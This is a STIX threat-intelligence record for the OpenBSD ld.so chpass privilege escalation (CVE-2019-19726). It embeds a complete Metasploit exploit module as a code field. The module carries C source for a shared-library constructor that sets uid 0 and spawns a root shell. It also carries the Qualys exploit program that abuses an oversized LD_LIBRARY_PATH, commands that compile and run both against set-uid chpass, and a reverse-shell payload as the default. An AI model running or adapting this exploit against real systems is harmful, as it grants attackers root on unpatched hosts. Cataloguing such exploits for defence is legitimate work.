{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4ee9e026-9265-4e4d-b816-a104092eaee1",
    "created": "2024-08-14T16:34:13.424571Z",
    "modified": "2024-08-14T16:34:13.424575Z",
    "name": "OpenBSD Dynamic Loader chpass Privilege Escalation",
    "description": " This module exploits a vulnerability in the OpenBSD `ld.so`",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/openbsd/local/dynamic_loader_chpass_privesc.rb",
            "external_id": "dynamic_loader_chpass_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-19726"
        },
        {
            "source_name": "reference",
            "url": "https://blog.qualys.com/laws-of-vulnerabilities/2019/12/11/openbsd-local-privilege-escalation-vulnerability-cve-2019-19726"
        },
        {
            "source_name": "reference",
            "url": "https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2019/12/11/9"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19726/openbsd-dynamic-loader-chpass"
        },
        {
            "source_name": "reference",
            "url": "https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/013_ldso.patch.sig"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OpenBSD Dynamic Loader chpass Privilege Escalation',\n        'Description' => %q{\n          This module exploits a vulnerability in the OpenBSD `ld.so`\n          dynamic loader (CVE-2019-19726).\n\n          The `_dl_getenv()` function fails to reset the `LD_LIBRARY_PATH`\n          environment variable when set with approximately `ARG_MAX` colons.\n\n          This can be abused to load `libutil.so` from an untrusted path,\n          using `LD_LIBRARY_PATH` in combination with the `chpass` set-uid\n          executable, resulting in privileged code execution.\n\n          This module has been tested successfully on:\n\n          OpenBSD 6.1 (amd64); and\n          OpenBSD 6.6 (amd64)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Qualys', # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2019-12-11',\n        'Platform' => %w[bsd unix], # OpenBSD\n        'Arch' => [ARCH_CMD],\n        'SessionTypes' => ['shell'],\n        'References' => [\n          ['CVE', '2019-19726'],\n          ['EDB', '47780'],\n          ['URL', 'https://blog.qualys.com/laws-of-vulnerabilities/2019/12/11/openbsd-local-privilege-escalation-vulnerability-cve-2019-19726'],\n          ['URL', 'https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2019/12/11/9'],\n          ['URL', 'https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19726/openbsd-dynamic-loader-chpass'],\n          ['URL', 'https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/013_ldso.patch.sig']\n        ],\n        'Targets' => [['Automatic', {}]],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse',\n          'WfsDelay' => 10\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('CHPASS_PATH', [true, 'Path to chpass', '/usr/bin/chpass'])\n    ])\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def chpass_path\n    datastore['CHPASS_PATH']\n  end\n\n  def upload(path, data)\n    print_status(\"Writing '#{path}' (#{data.size} bytes) ...\")\n    rm_f(path)\n    write_file(path, data)\n    register_file_for_cleanup(path)\n  end\n\n  def libutil_name\n    return unless command_exists?('readelf')\n\n    cmd_exec('readelf -a /usr/sbin/pwd_mkdb').to_s.scan(/\\[(libutil\\.so\\.[\\d.]+)\\]/).flatten.first\n  end\n\n  def check\n    patches = cmd_exec('syspatch -l').to_s\n    patch = '013_ldso'\n\n    return CheckCode::Safe(\"Patch #{patch} has been installed. Target is not vulnerable.\") if patches.include?(patch)\n\n    return CheckCode::Safe(\"Patch #{patch} is not present, but cc compiler is not installed.\") unless command_exists?('cc')\n\n    vprint_good('cc is installed')\n\n    CheckCode::Detected(\"Patch #{patch} is not present\")\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'\n    end\n\n    unless writable?(base_dir)\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Qualys set-uid shared object from https://www.openwall.com/lists/oss-security/2019/12/11/9\n    lib_data = <<~EOF\n      #include <paths.h>\n      #include <unistd.h>\n\n      static void __attribute__ ((constructor)) _init (void) {\n          if (setuid(0) != 0) _exit(__LINE__);\n          if (setgid(0) != 0) _exit(__LINE__);\n          char * const argv[] = { _PATH_KSHELL, \"-c\", _PATH_KSHELL \"; exit 1\", NULL };\n          execve(argv[0], argv, NULL);\n          _exit(__LINE__);\n      }\n    EOF\n\n    libs = []\n    lib = libutil_name\n    if lib\n      libs << lib\n      print_good(\"Found libutil.so name: #{lib}\")\n    else\n      libs << 'libutil.so.12.1'\n      libs << 'libutil.so.13.1'\n      print_warning(\"Could not determine libutil.so name. Using: #{libs.join(', ')}\")\n    end\n\n    lib_src_path = \"#{base_dir}/.#{rand_text_alphanumeric 5..10}.c\"\n    upload lib_src_path, lib_data\n    libs.each do |lib_name|\n      lib_path = \"#{base_dir}/#{lib_name}\"\n      print_status(\"Compiling #{lib_path} ...\")\n      output = cmd_exec(\"cc -fpic -shared -s -o #{lib_path} #{lib_src_path} -Wall\")\n      register_file_for_cleanup(lib_path)\n\n      unless output.blank?\n        print_error(output)\n        fail_with(Failure::Unknown, \"#{lib_path}.c failed to compile\")\n      end\n    end\n\n    # Qualys exploit from https://www.openwall.com/lists/oss-security/2019/12/11/9\n    exploit_data = <<~EOF\n      #include <string.h>\n      #include <sys/param.h>\n      #include <sys/resource.h>\n      #include <unistd.h>\n\n      int\n      main(int argc, char * const * argv)\n      {\n          #define LLP \"LD_LIBRARY_PATH=.\"\n          static char llp[ARG_MAX - 128];\n          memset(llp, ':', sizeof(llp)-1);\n          memcpy(llp, LLP, sizeof(LLP)-1);\n          char * const envp[] = { llp, \"EDITOR=echo '#' >>\", NULL };\n\n          #define DATA (ARG_MAX * sizeof(char *))\n          const struct rlimit data = { DATA, DATA };\n          if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);\n\n          if (argc <= 1) _exit(__LINE__);\n          argv += 1;\n          execve(argv[0], argv, envp);\n          _exit(__LINE__);\n      }\n    EOF\n\n    exploit_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload(\"#{exploit_path}.c\", exploit_data)\n    print_status(\"Compiling #{exploit_path} ...\")\n    output = cmd_exec(\"cc -s #{exploit_path}.c -o #{exploit_path} -Wall\")\n    register_file_for_cleanup(exploit_path)\n\n    unless output.blank?\n      print_error(output)\n      fail_with(Failure::Unknown, \"#{exploit_path}.c failed to compile\")\n    end\n\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload(payload_path, \"#!/bin/sh\\n#{payload.encoded}\\n\")\n    chmod(payload_path)\n\n    print_status('Launching exploit...')\n    output = cmd_exec(\"cd #{base_dir};echo '#{payload_path}&exit'|#{exploit_path} #{chpass_path}\")\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-12-11",
    "x_mitre_platforms": [
        "%w[bsd unix], # OpenBSD"
    ]
}